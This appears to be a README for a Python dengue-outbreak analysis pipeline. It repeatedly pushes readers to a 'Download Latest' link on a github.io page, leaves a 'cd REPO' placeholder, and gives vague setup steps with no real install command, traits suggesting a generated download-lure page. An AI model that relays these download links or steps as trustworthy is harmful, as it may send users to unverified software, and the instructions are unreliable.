# DART Pipeline - Data Analysis Pipeline 2026

> **DART Pipeline is a Python-based data analysis workflow for combining dengue epidemiology, climate, and behavioural data to support reproducible outbreak anticipation and prediction.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/zack-millercn895/dart-data-analysis-pipeline?style=flat-square)](https://github.com/zack-millercn895/dart-data-analysis-pipeline)

---

<p align="center">
  <a href="https://zack-millercn895.github.io/dart-data-analysis-pipeline/">
    <img src="https://img.shields.io/badge/Download-DART%20Pipeline%20Latest-brightgreen?style=for-the-badge" alt="Download DART Pipeline">
  </a>
</p>

> **[Download DART Pipeline Latest](https://zack-millercn895.github.io/dart-data-analysis-pipeline/)**

---

[Download Latest Build](https://zack-millercn895.github.io/dart-data-analysis-pipeline/)

---

## Overview

DART Pipeline provides a Python workflow for dengue research, preparedness, and data-driven analysis. It combines epidemiological records with climate and behavioural datasets so users can examine how these factors relate to one another and evaluate possible outbreak conditions through a consistent process.

The pipeline is suited to researchers, analysts, and teams that need repeatable data preparation and prediction workflows. Support for Parquet files, command-line execution, PNG metric visualisations, and Docker-based runs makes it practical to operate consistently across environments and workloads.

---

## What It Provides

- Combines dengue epidemiology, climate, and behavioural data for analysis
- Supports outbreak anticipation and prediction workflows
- Enables repeatable processing for reproducible studies
- Uses a pipeline structure that can scale to larger data workloads
- Reads and processes Parquet data
- Provides a command-line interface for running pipeline tasks
- Writes metric visualisations as PNG files
- Supports execution with Docker
- Runs with Python 3.11 or later

---

## Installation

### Get the source code

```bash
git clone https://github.com/zack-millercn895/dart-data-analysis-pipeline.git
cd REPO
```

### Set up Python

Use Python 3.11 or a newer release to create an isolated environment, then install dependencies using the project's packaging and dependency definitions.

```bash
python3.11 -m venv .venv
source .venv/bin/activate
```

For Windows PowerShell, create and activate the environment with:

```powershell
py -3.11 -m venv .venv
.venv\Scripts\Activate.ps1
```

Once the project is installed, display the available CLI arguments before running a workflow:

```bash
dart-pipeline --help
```

Projects launched through a Python entry point should use the entry point defined by the repository configuration.

### Run with Docker

For containerised use, build or launch the project with the Docker configuration supplied in the repository. Mount both the input data and output directory to keep processed datasets and PNG metric plots accessible after the container finishes.

---

## Running the Pipeline

A standard analysis generally follows this sequence:

1. Prepare the epidemiological, climate, and behavioural inputs in the formats expected by the project.
2. Use Parquet for larger tabular datasets where suitable.
3. Choose the desired analysis or prediction workflow through the CLI.
4. Execute the pipeline with the prepared data.
5. Inspect the resulting metrics and PNG visualisations.
6. Retain the configuration and input references used for the run.

To see the currently available options, run:

```bash
dart-pipeline --help
```

For example, a run may specify separate locations for source data and generated results:

```bash
dart-pipeline \
  --input-dir ./data \
  --output-dir ./results
```

Available arguments vary according to the installed entry point and selected workflow. The command help and repository configuration remain the authoritative sources for supported options.

---

## Configuration

Use the configuration format provided by the repository to keep paths and workflow settings in one place. This can define data locations, result directories, and analysis parameters instead of requiring every value to be entered directly on the command line.

Example layout:

```yaml
data:
  epidemiology: ./data/epidemiology
  climate: ./data/climate
  behavioural: ./data/behavioural

output:
  directory: ./results
  plots: ./results/plots

workflow:
  format: parquet
```

This YAML illustrates the general structure; match the actual keys to the configuration files included with the project. Depending on the workflow, settings can come from configuration files, command-line arguments, or documented defaults.

---

## System Requirements

- Python 3.11 or newer
- A compatible Python environment containing the project dependencies
- Storage for epidemiological, climate, and behavioural input data
- Extra storage for processed Parquet files and PNG metric results
- Docker for users choosing containerised execution
- A command-line environment for launching the pipeline

The required resources depend on the size of the datasets and the scale of the selected workflow.

---

## Frequently Asked Questions

### What kind of users is DART Pipeline designed for?

DART Pipeline is aimed at analysts and researchers using dengue epidemiological, climate, and behavioural data, especially for repeatable analysis and outbreak prediction work.

### How can I see the supported commands?

Use the CLI help command:

```bash
dart-pipeline --help
```

If the command is unavailable after installation, inspect the package configuration to find the entry point defined by the repository.

### Does the pipeline support Parquet?

Yes. Parquet input and processing are supported for structured tabular data workflows.

### In what format are metric plots generated?

Metric visualisations are saved as PNG files. The output directory is controlled by the configured destination or the applicable command-line option.

### Is Docker execution available?

Yes. The project includes Docker support for container-based runs.

### What should I investigate when execution fails?

Verify that Python 3.11 or later is active, all dependencies are installed, the input paths are valid, and the supplied files use an expected format. Also review the CLI help and any messages written during execution.

### What practices help preserve reproducibility?

For every run, retain the referenced inputs, configuration, command-line options, and generated results together. Keeping these elements aligned with the same workflow structure makes subsequent analyses easier to reproduce and compare.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
